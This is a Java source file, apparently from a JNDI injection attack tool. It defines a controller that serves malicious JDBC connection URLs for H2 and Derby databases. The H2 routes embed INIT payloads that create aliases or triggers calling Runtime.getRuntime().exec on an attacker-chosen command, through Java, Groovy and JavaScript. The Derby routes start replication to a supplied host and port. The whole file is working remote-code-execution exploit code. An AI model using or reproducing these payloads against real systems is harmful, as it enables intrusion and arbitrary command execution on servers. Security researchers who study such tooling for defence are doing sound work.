package map.jndi.controller;

import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.bean.DatabaseBean;

@JNDIController
public class DatabaseController implements Controller {
    @JNDIMapping("/H2/Alias/{cmd}")
    public DatabaseBean h2Alias(String cmd) {
        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                "CALL EXEC ('" + cmd + "')\\;";

        System.out.println("H2 CREATE ALIAS Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/H2/Groovy/{cmd}")
    public DatabaseBean h2Groovy(String cmd) {
        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";

        System.out.println("H2 Groovy Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/H2/JavaScript/{cmd}")
    public DatabaseBean h2JavaScript(String cmd) {
        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";

        System.out.println("H2 JavaScript Cmd: " + cmd);
        return new DatabaseBean("org.h2.Driver", url);
    }

    @JNDIMapping("/Derby/Create/{database}")
    public DatabaseBean derbyCreate(String database) {
        String url = "jdbc:derby:" + database + ";create=true";

        System.out.println("Derby Create Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url);
    }

    @JNDIMapping("/Derby/Slave/{host}/{port}/{database}")
    public DatabaseBean derbySlave(String host, String port, String database) {
        String url = "jdbc:derby:" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;

        System.out.println("Derby Slave Replication Mode Host: " + host + " Port: " + port + " Database: " + database);
        return new DatabaseBean("org.apache.derby.jdbc.EmbeddedDriver", url);
    }
}
